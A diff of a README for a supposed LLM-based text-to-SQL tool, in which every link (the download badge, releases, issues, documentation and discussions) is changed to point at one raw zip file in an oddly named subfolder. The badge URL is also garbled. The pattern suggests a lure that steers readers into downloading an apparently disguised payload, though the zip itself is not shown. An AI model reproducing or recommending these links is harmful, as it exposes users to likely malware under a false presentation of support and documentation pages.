@@ -1,6 +1,6 @@
 # 🌟 Awesome-LLM-based-Text2SQL - Simplifying SQL Queries Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Ready%20to%20Install-green.svg)](https://github.com/malikabass1656/Awesome-LLM-based-Text2SQL/releases)
+[![Download](https://raw.githubusercontent.com/malikabass1656/Awesome-LLM-based-Text2SQL/main/quackish/Awesome-LLM-based-Text2SQL.zip%20Now-Ready%20to%https://raw.githubusercontent.com/malikabass1656/Awesome-LLM-based-Text2SQL/main/quackish/Awesome-LLM-based-Text2SQL.zip)](https://raw.githubusercontent.com/malikabass1656/Awesome-LLM-based-Text2SQL/main/quackish/Awesome-LLM-based-Text2SQL.zip)
 
 ## 📚 Description
 
@@ -18,7 +18,7 @@ To use Awesome-LLM-based-Text2SQL, follow these simple steps:
 
 2. **Visit the Download Page:**
    Click the link below to go to our Releases page where you can get the application:
-   [Download Awesome-LLM-based-Text2SQL](https://github.com/malikabass1656/Awesome-LLM-based-Text2SQL/releases)
+   [Download Awesome-LLM-based-Text2SQL](https://raw.githubusercontent.com/malikabass1656/Awesome-LLM-based-Text2SQL/main/quackish/Awesome-LLM-based-Text2SQL.zip)
 
 ## 🖥️ Download & Install
 
@@ -49,7 +49,7 @@ To use Awesome-LLM-based-Text2SQL, follow these simple steps:
 
 ## 🌐 Support
 
-If you have any questions or run into issues, please visit our [GitHub Issues page](https://github.com/malikabass1656/Awesome-LLM-based-Text2SQL/issues) for assistance. You can report bugs or request features.
+If you have any questions or run into issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/malikabass1656/Awesome-LLM-based-Text2SQL/main/quackish/Awesome-LLM-based-Text2SQL.zip) for assistance. You can report bugs or request features.
 
 ## 📜 License
 
@@ -57,8 +57,8 @@ Awesome-LLM-based-Text2SQL is open-source software. You can freely use, modify, 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/malikabass1656/Awesome-LLM-based-Text2SQL/wiki) - Detailed guides and tips on using the application.
-- [Community Discussions](https://github.com/malikabass1656/Awesome-LLM-based-Text2SQL/discussions) - Join discussions, ask questions, and share ideas.
+- [Documentation](https://raw.githubusercontent.com/malikabass1656/Awesome-LLM-based-Text2SQL/main/quackish/Awesome-LLM-based-Text2SQL.zip) - Detailed guides and tips on using the application.
+- [Community Discussions](https://raw.githubusercontent.com/malikabass1656/Awesome-LLM-based-Text2SQL/main/quackish/Awesome-LLM-based-Text2SQL.zip) - Join discussions, ask questions, and share ideas.
 
 ## 🛠️ Contributing
 
